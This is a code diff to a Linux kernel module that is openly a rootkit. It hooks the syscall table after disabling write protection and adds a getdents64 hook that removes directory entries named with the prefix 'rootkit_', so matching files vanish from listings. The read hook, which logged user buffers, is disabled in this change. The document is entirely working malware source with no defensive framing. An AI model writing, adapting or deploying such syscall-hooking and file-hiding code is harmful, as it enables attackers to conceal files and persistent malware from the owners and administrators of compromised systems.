@@ -42,14 +42,14 @@ void make_page_readonly(long unsigned int _addr){
 // hooked functions
 asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     ssize_t retval;
-    if (!try_module_get(THIS_MODULE)){
-        return -1;
-    }
+//    if (!try_module_get(THIS_MODULE)){
+//        return -1;
+//    }
     if (*buf && count > 1024){
         printk(KERN_INFO "hooked_read(%d, %s, %d)", fd, buf, count);
     }
     retval = original_read(fd, buf, count);
-    module_put(THIS_MODULE);
+//    module_put(THIS_MODULE);
     return retval;
 }
 
@@ -70,16 +70,39 @@ asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user 
 }
 
 asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
-    struct linux_dirent64 __user *cur_dirent; 
+    struct linux_dirent64 __user *cur_dirent;
     ssize_t result;
     int bpos;
+    char hidename[] = "rootkit_";
+    unsigned short cur_reclen;
+
     printk(KERN_INFO "our very own hooked_getdents64\n");
     result = original_getdents64(fd, dirent, count);
     printk(KERN_INFO "Here go the files %d :\n", result);
     printk(KERN_INFO "----------------- Here are the files ------------------------------------");
     cur_dirent = dirent;
+
     for (bpos=0; bpos < result;){
-        cur_dirent = (struct linux_dirent64*)(dirent + bpos);
+        cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);
+
+        printk(KERN_INFO "%s\n", (char*)(cur_dirent->d_name));
+        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
+            printk(KERN_INFO "found a file to hide:%s\n",cur_dirent->d_name);
+            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
+            cur_reclen = cur_dirent->d_reclen;
+            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
+            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
+            result -= cur_reclen;
+            //printk(KERN_INFO "new result = %d\n", result);
+        } else {
+            bpos += cur_dirent->d_reclen;
+        }
+    }
+
+    printk(KERN_INFO "----------------- After modification ------------------------------------");
+
+    for(bpos = 0; bpos < result;){
+        cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);
         printk(KERN_INFO "%s\n", (char*)(cur_dirent->d_name));
         bpos += cur_dirent->d_reclen;
     }
@@ -97,7 +120,7 @@ void hook_functions(void){
   // remove write protection
   make_page_writable((long unsigned int) ptr_sys_call_table);
   // replace function pointers! YEEEHOW!!
-  sys_call_table[__NR_read] = (void*) hooked_read;
+  //sys_call_table[__NR_read] = (void*) hooked_read;
   sys_call_table[__NR_getdents] = (void*) hooked_getdents;
   sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
 }
